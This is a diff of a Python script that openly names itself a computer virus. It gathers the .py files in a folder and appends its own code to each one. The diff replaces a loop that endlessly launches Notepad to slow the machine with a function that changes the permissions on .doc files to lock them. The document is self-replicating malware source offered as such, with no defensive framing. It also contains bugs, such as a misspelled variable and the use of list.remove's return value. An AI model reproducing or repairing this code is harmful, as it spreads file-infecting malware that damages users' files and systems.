@@ -6,7 +6,8 @@ import os
 # finding files which we want to infect
 
 def files_to_infect():
-    return glob.glob('*.py')
+    files_list = glob.glob('*.py')
+    return file_list.remove(__file__)
 
 # getting virus code to cpoy itself to another python files
 
@@ -19,26 +20,28 @@ def get_virus_code():
 
 def copy_virus(content):
  for files in files_to_infect():
-    file = open(files,'w')
+    file = open(files,'a')
     file.write(content)
-    file.close()
+    file.close()  
 
 # calling the functions  to copy the virus and overwriting the content of virus code
 
 def infect():
     copy_virus(get_virus_code())
 
-# slowing down the computer
+# corrupting ms document files
 
-def crash_computer():
-        while True:
-            os.system('start Notepad')
-    
+def lock_files():
+ files_to_lock = glob.glob('*.doc')
+ 
+ for doc_files in files_to_lock:
+  os.chmod(doc_files,100)
+  
 # finally calling the important functions of virus
 
 def final_virus():
  infect()
- crash_computer()
+ lock_files()
 
 # calling the function called final virus which will be our new python computer virus
 
